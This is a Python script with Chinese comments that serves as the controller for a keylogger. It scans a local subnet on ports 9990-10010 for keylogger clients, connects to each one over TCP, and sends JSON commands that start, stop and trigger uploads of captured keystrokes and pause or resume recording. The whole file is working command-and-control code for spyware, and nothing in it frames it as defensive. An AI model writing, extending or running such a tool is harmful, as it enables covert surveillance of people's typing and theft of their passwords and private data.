#!/usr/bin/env python3
"""
Keylogger 服务器连接测试脚本
用于测试与 Keylogger 客户端的连接和通信
"""

import socket
import json
import sys
import time
import threading

def receive_responses(sock, stop_event):
    """后台线程接收响应"""
    while not stop_event.is_set():
        try:
            sock.settimeout(1.0)
            response = sock.recv(4096).decode('utf-8')
            if response:
                print(f"\n[服务器推送] {response.strip()}")
                print("命令> ", end='', flush=True)
        except socket.timeout:
            continue
        except:
            break

def send_command(sock, command_dict, wait_response=True):
    """发送命令并接收响应"""
    command_str = json.dumps(command_dict) + "\n"
    print(f"[发送] {command_str.strip()}")
    
    try:
        sock.send(command_str.encode('utf-8'))
        
        if wait_response:
            # 接收响应
            sock.settimeout(10)
            response = sock.recv(4096).decode('utf-8')
            print(f"[接收] {response.strip()}")
            
            try:
                return json.loads(response)
            except:
                return {"status": "error", "raw": response}
    except Exception as e:
        print(f"[错误] 发送失败: {e}")
        return {"status": "error", "message": str(e)}
    
    return {"status": "sent"}

def test_connection(ip, port):
    """测试与 Keylogger 客户端的连接"""
    print(f"\n{'='*50}")
    print(f"正在连接 {ip}:{port}")
    print(f"{'='*50}\n")
    
    sock = None
    
    try:
        # 创建 socket 连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        print(f"[1] 连接到 {ip}:{port} ...")
        sock.connect((ip, port))
        print("[1] 连接成功!\n")
        
        # 启动后台接收线程
        stop_event = threading.Event()
        recv_thread = threading.Thread(target=receive_responses, args=(sock, stop_event))
        recv_thread.daemon = True
        recv_thread.start()
        
        # 测试 ping 命令
        print("[2] 发送 ping 命令...")
        response = send_command(sock, {"action": "ping"})
        print(f"[2] 客户端状态:")
        if "data" in response:
            data = response["data"]
            print(f"    - IP: {data.get('ip', 'N/A')}")
            print(f"    - 本地端口: {data.get('local_port', 'N/A')}")
            print(f"    - 录制中: {data.get('recording', 'N/A')}")
            print(f"    - 上传启用: {data.get('upload_enabled', 'N/A')}")
        print()
        
        # 测试 get_status 命令
        print("[3] 发送 get_status 命令...")
        response = send_command(sock, {"action": "get_status"})
        print()
        
        # 交互式命令测试
        print("[4] 进入交互模式，输入命令测试 (输入 'quit' 退出):")
        print("可用命令: start_upload, stop_upload, upload_once, pause_record, resume_record, ping, get_status")
        print()
        
        while True:
            try:
                user_input = input("命令> ").strip()
                if user_input.lower() == 'quit':
                    break
                
                valid_commands = ['start_upload', 'stop_upload', 'upload_once', 
                                  'pause_record', 'resume_record', 'ping', 'get_status']
                if user_input in valid_commands:
                    send_command(sock, {"action": user_input})
                else:
                    print("未知命令，可用命令:", ", ".join(valid_commands))
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"错误: {e}")
        
        stop_event.set()
        recv_thread.join(timeout=2)
        
    except ConnectionRefusedError:
        print(f"[错误] 无法连接到 {ip}:{port}")
        print("可能的原因:")
        print("  1. Keylogger 程序未运行")
        print("  2. 防火墙阻止了连接")
        print("  3. IP 地址或端口错误")
        return False
        
    except socket.timeout:
        print(f"[错误] 连接超时")
        return False
        
    except Exception as e:
        print(f"[错误] {e}")
        import traceback
        traceback.print_exc()
        return False
    
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
        print("\n[5] 连接已关闭")
    
    return True

def scan_network(base_ip, start_port, end_port):
    """扫描网络中的 Keylogger 客户端"""
    print(f"\n扫描 {base_ip} 的端口 {start_port}-{end_port}...")
    found = []
    
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((base_ip, port))
            if result == 0:
                # 尝试发送 ping 命令验证
                try:
                    sock.settimeout(2)
                    sock.send(b'{"action":"ping"}\n')
                    response = sock.recv(1024)
                    if b'pong' in response:
                        print(f"  [发现] Keylogger 在 {base_ip}:{port}")
                        found.append((base_ip, port))
                except:
                    pass
            sock.close()
        except:
            pass
    
    return found

def main():
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  python {sys.argv[0]} <IP地址> [端口]")
        print(f"  python {sys.argv[0]} scan <网段> (例如: 192.168.1)")
        print()
        print("示例:")
        print(f"  python {sys.argv[0]} 192.168.1.100 9999")
        print(f"  python {sys.argv[0]} 127.0.0.1 9999")
        print(f"  python {sys.argv[0]} scan 192.168.1")
        sys.exit(1)
    
    if sys.argv[1] == 'scan':
        if len(sys.argv) < 3:
            print("请指定网段，例如: 192.168.1")
            sys.exit(1)
        
        base_ip = sys.argv[2]
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            found = scan_network(ip, 9990, 10010)
            for ip, port in found:
                print(f"\n发现 Keylogger: {ip}:{port}")
                test_connection(ip, port)
    else:
        ip = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
        test_connection(ip, port)

if __name__ == "__main__":
    main()
